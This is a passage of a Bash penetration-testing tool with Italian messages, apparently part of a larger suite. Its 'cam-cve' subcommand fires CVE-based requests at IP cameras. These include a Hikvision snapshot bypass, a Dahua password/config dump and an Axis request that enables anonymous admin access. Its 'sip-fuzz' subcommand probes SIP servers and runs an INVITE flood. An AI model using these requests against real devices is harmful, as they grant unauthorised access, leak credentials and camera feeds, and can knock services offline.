#  SUBCOMMAND: cam-cve
# ============================================================
usage_camcve() {
    echo "Uso: exa-dune cam-cve <TARGET> [OPTIONS]"
    echo ""
    echo "  Camera CVE Scanner — verifica vulnerabilità note su telecamere IP."
    echo "  Supporta: Hikvision, Dahua, Axis, Reolink, Uniview, Foscam."
    echo ""
    echo "Opzioni:"
    echo "  --vendor VENDOR  hikvision|dahua|axis|reolink|generic (default: auto)"
    echo "  --port PORT      HTTP port (default: 80)"
    echo "  --ssl            Usa HTTPS (443)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_camcve() {
    local target="" vendor="auto" port=80 use_ssl=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --vendor)    vendor="$2";       shift 2 ;;
            --port)      port="$2";         shift 2 ;;
            --ssl)       use_ssl=1;         shift ;;
            --output)    OUTDIR_BASE="$2";  shift 2 ;;
            --stealth)   STEALTH=1;         shift ;;
            --dry-run)   DRY_RUN=1;         shift ;;
            --help|-h)   usage_camcve; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_camcve; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_camcve; exit 1; }
    check_root
    setup_outdir "$target" "cam_cve"
    local scheme="http"; [[ $use_ssl -eq 1 ]] && { scheme="https"; port=443; }
    local base_url="${scheme}://${target}:${port}"
    local curl_opts="-s --max-time 8 -k"
    log "Target: $base_url | Vendor: $vendor | Output: $OUTDIR"

    # ── Auto-detect vendor da header/banner ──────────────────
    section "Camera Vendor Detection"
    local detect_out="$OUTDIR/cam_detect.txt"
    if [[ $DRY_RUN -eq 0 ]]; then
        local headers; headers=$(curl $curl_opts -I "$base_url/" 2>/dev/null || true)
        echo "$headers" > "$detect_out"
        if [[ "$vendor" == "auto" ]]; then
            echo "$headers" | grep -qi "hikvision\|dvr\|ipc\|hik" && vendor="hikvision"
            echo "$headers" | grep -qi "dahua\|dh-" && vendor="dahua"
            echo "$headers" | grep -qi "axis\|vapix" && vendor="axis"
            echo "$headers" | grep -qi "reolink" && vendor="reolink"
            echo "$headers" | grep -qi "uniview\|univideo" && vendor="uniview"
            [[ "$vendor" == "auto" ]] && vendor="generic"
            ok "Vendor rilevato: $vendor"
        fi
    fi

    # ── CVE checks per vendor ─────────────────────────────────
    section "CVE Checks — $vendor"
    local cve_out="$OUTDIR/cam_cve_results.txt"

    _cam_check() {
        local cve="$1" desc="$2" url="$3" pattern="$4" severity="${5:-HIGH}"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} $cve — $desc — GET $url"
            return
        fi
        local resp; resp=$(curl $curl_opts "$url" 2>/dev/null || true)
        if [[ -n "$pattern" ]]; then
            if echo "$resp" | grep -qi "$pattern"; then
                found "$severity" "CAM-CVE" "$cve VULNERABLE: $desc ($url)"
                echo "[VULN] $cve $desc" | tee -a "$cve_out"
                echo "$resp" | head -5 >> "$cve_out"
            else
                echo "[SAFE] $cve $desc" >> "$cve_out"
                log "  $cve: non vulnerabile"
            fi
        else
            local code; code=$(curl $curl_opts -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
            if [[ "$code" == "200" ]]; then
                found "$severity" "CAM-CVE" "$cve POSSIBLMENTE VULNERABILE ($code): $desc"
                echo "[WARN] $cve $code $desc" | tee -a "$cve_out"
            else
                echo "[SAFE] $cve HTTP $code $desc" >> "$cve_out"
            fi
        fi
    }

    case "$vendor" in
        hikvision)
            # CVE-2021-36260: Command injection via /SDK/webLanguage (unauthenticated)
            _cam_check "CVE-2021-36260" "Hikvision unauthenticated RCE via webLanguage" \
                "$base_url/SDK/webLanguage" "root\|passwd\|/bin" "CRITICAL"
            # CVE-2017-7921: Unauthenticated snapshot bypass
            _cam_check "CVE-2017-7921" "Hikvision unauthenticated snapshot bypass" \
                "$base_url/onvif-http/snapshot?auth=YWRtaW46MTEM" "JFIF\|Content-Type.*image" "HIGH"
            # CVE-2014-4880: Default credentials page exposure
            _cam_check "CVE-2014-4880" "Hikvision default credentials login page" \
                "$base_url/ISAPI/Security/userCheck" "statusValue\|200\|OK" "MEDIUM"
            # Information disclosure: device info without auth
            _cam_check "INFO-DISC" "Hikvision device info unauthenticated" \
                "$base_url/ISAPI/System/deviceInfo" "deviceName\|firmwareVersion" "HIGH"
            ;;
        dahua)
            # CVE-2021-33044: Authentication bypass via specific URI
            _cam_check "CVE-2021-33044" "Dahua auth bypass via magic packet" \
                "$base_url/cgi-bin/global.login?username=admin&ipAddr=0.0.0.0&clientType=Web3.0" \
                "session\|success\|token" "CRITICAL"
            # CVE-2017-7925: Unauthenticated config download
            _cam_check "CVE-2017-7925" "Dahua unauthenticated config dump" \
                "$base_url/current_config/passwd" "admin\|root\|password" "CRITICAL"
            # Default config exposure
            _cam_check "INFO-DISC" "Dahua device type unauthenticated" \
                "$base_url/cgi-bin/magicBox.cgi?action=getDeviceType" "DeviceType" "HIGH"
            ;;
        axis)
            # CVE-2018-10660: Axis root shell via parameter injection
            _cam_check "CVE-2018-10660" "Axis unauthenticated root shell via VAPIX" \
                "$base_url/axis-cgi/admin/param.cgi?action=update&root.Users.Admin.AuthAnonymous=yes" \
                "200\|OK" "CRITICAL"
            # VAPIX unauthenticated access
            _cam_check "CVE-2016-6201" "Axis VAPIX auth bypass — snapshot" \
                "$base_url/axis-cgi/jpg/image.cgi" "JFIF\|Content-Type.*image" "HIGH"
            # Info disclosure
            _cam_check "INFO-DISC" "Axis device info unauthenticated" \
                "$base_url/axis-cgi/param.cgi?action=list&group=root.Brand" "Brand\|ProdFullName" "MEDIUM"
            ;;
        reolink)
            # Reolink RTSP credential in URL (firmware artifact)
            _cam_check "INFO-DISC-RTSP" "Reolink RTSP credential in URL pattern" \
                "$base_url/cgi-bin/api.cgi?cmd=GetRtspUrl" "password\|rtsp\|credential" "HIGH"
            # Reolink API without token
            _cam_check "INFO-DISC-API" "Reolink API device info no-auth" \
                "$base_url/cgi-bin/api.cgi?cmd=GetDevInfo&channel=0&rs=xxxx&user=admin&password=" \
                "DevInfo\|firmVer\|name" "MEDIUM"
            # CGI exec endpoint
            _cam_check "INFO-DISC-CGI" "Reolink exec.cgi unauthenticated access" \
                "$base_url/cgi-bin/api.cgi?cmd=Logout&rs=xxxx" "value\|code" "LOW"
            ;;
        generic|*)
            # Generic camera checks (work across multiple vendors)
            _cam_check "GENERIC-SNAPSHOT" "Unauthenticated snapshot" \
                "$base_url/cgi-bin/snapshot.cgi" "JFIF\|Content-Type.*image" "HIGH"
            _cam_check "GENERIC-CONFIG" "Config backup unauthenticated" \
                "$base_url/cgi-bin/config.cgi" "admin\|password\|ssid" "HIGH"
            _cam_check "GENERIC-RTSP" "RTSP credential in web response" \
                "$base_url/cgi-bin/hi3510/param.cgi?cmd=getrtspurl" "rtsp\|password" "HIGH"
            _cam_check "GENERIC-EXEC" "Exec CGI endpoint" \
                "$base_url/cgi-bin/exec.cgi" "" "MEDIUM"
            _cam_check "GENERIC-DEBUG" "Debug endpoint exposed" \
                "$base_url/cgi-bin/debug.cgi" "" "MEDIUM"
            _cam_check "ONVIF-INFO" "ONVIF device info unauthenticated" \
                "$base_url:8000" "onvif\|soap\|device" "MEDIUM"
            ;;
    esac

    ok "Camera CVE scan completato → $OUTDIR (vendor: $vendor)"
}

# ============================================================
#  SUBCOMMAND: sip-fuzz
# ============================================================
usage_sipfuzz() {
    echo "Uso: exa-dune sip-fuzz <TARGET> [OPTIONS]"
    echo ""
    echo "  SIP Fuzzing — invia messaggi SIP malformati e stress test."
    echo "  Usa sipsak per OPTIONS flood, header fuzzing, tracerouting SIP."
    echo ""
    echo "Opzioni:"
    echo "  --port PORT      Porta SIP (default: 5060)"
    echo "  --method M       Metodo SIP: OPTIONS|INVITE|REGISTER (default: OPTIONS)"
    echo "  --count N        Numero di messaggi (default: 50)"
    echo "  --sleep MS       Delay tra messaggi in ms (default: 100)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_sipfuzz() {
    local target="" port=5060 method="OPTIONS" count=50 sleep_ms=100
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      port="$2";      shift 2 ;;
            --method)    method="$2";    shift 2 ;;
            --count)     count="$2";     shift 2 ;;
            --sleep)     sleep_ms="$2";  shift 2 ;;
            --output)    OUTDIR_BASE="$2"; shift 2 ;;
            --stealth)   STEALTH=1;      shift ;;
            --dry-run)   DRY_RUN=1;      shift ;;
            --help|-h)   usage_sipfuzz; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_sipfuzz; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_sipfuzz; exit 1; }
    check_root
    setup_outdir "$target" "sip_fuzz"
    log "Target: $target:$port | Metodo: $method | Output: $OUTDIR"

    # ── sipsak: SIP Swiss Army Knife ─────────────────────────
    section "SIP $method Probe (sipsak)"
    local sipsak_out="$OUTDIR/sipsak_probe.txt"
    if command -v sipsak &>/dev/null; then
        # Single OPTIONS probe con verbose
        run_cmd "sipsak_probe" "sipsak -v -s sip:probe@${target}:${port} 2>&1 | tee $sipsak_out"
        if [[ -s "$sipsak_out" ]]; then
            # Server banner e Allow
            local server_hdr; server_hdr=$(grep -i "^Server:" "$sipsak_out" 2>/dev/null | head -1 || true)
            local allow_hdr; allow_hdr=$(grep -i "^Allow:" "$sipsak_out" 2>/dev/null | head -1 || true)
            [[ -n "$server_hdr" ]] && found "INFO" "SIP-FUZZ" "Server: $server_hdr"
            [[ -n "$allow_hdr" ]] && found "INFO" "SIP-FUZZ" "Metodi SIP permessi: $allow_hdr"
            if grep -q "200\|OK" "$sipsak_out" 2>/dev/null; then
                found "MEDIUM" "SIP-FUZZ" "Server SIP risponde a $method senza auth"
            fi
        fi
    else
        warn "sipsak non trovato — installa: apt install sipsak"
    fi

    # ── sipsak: SIP Trace/Traceroute ─────────────────────────
    section "SIP Trace (sipsak -T)"
    local trace_out="$OUTDIR/sipsak_trace.txt"
    if command -v sipsak &>/dev/null && [[ $DRY_RUN -eq 0 ]]; then
        timeout 20 sipsak -T -s "sip:trace@${target}:${port}" 2>&1 | tee "$trace_out" || true
        if grep -qi "hop\|Via\|200\|486" "$trace_out" 2>/dev/null; then
            found "INFO" "SIP-FUZZ" "SIP trace: $(wc -l < "$trace_out") hop(s) rilevati"
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} sipsak -T -s sip:trace@${target}:${port}" 
    fi

    # ── sipsak: INVITE flood (stress test) ───────────────────
    if [[ "$method" == "INVITE" ]]; then
        section "SIP INVITE Stress Test"
        local flood_out="$OUTDIR/sipsak_flood.txt"
        if command -v sipsak &>/dev/null; then
            run_cmd "sipsak_flood" "sipsak -f $count -s sip:stress@${target}:${port} 2>&1 | tee $flood_out"
            if grep -qi "flood\|request sent\|reply" "$flood_out" 2>/dev/null; then
                found "HIGH" "SIP-FUZZ" "INVITE stress test: server $target risponde — possibile DoS"
            fi
        fi
    fi

    # ── SIP nmap fuzzer NSE ───────────────────────────────────
    section "SIP Header Analysis (nmap sip-methods)"
    local nmap_sip="$OUTDIR/nmap_sip_methods.txt"
    run_cmd "nmap_sip" "nmap -sU -p $port --script sip-methods,sip-enum-users $NMAP_TIMING $target 2>/dev/null | tee $nmap_sip"
    if [[ -s "$nmap_sip" ]]; then
        while IFS= read -r line; do
            echo "$line" | grep -qE "^\|.*Method|^\|.*Extension" || continue
            found "INFO" "SIP-FUZZ" "$line"
        done < "$nmap_sip"
    fi

    ok "SIP fuzzing completato → $OUTDIR"
}

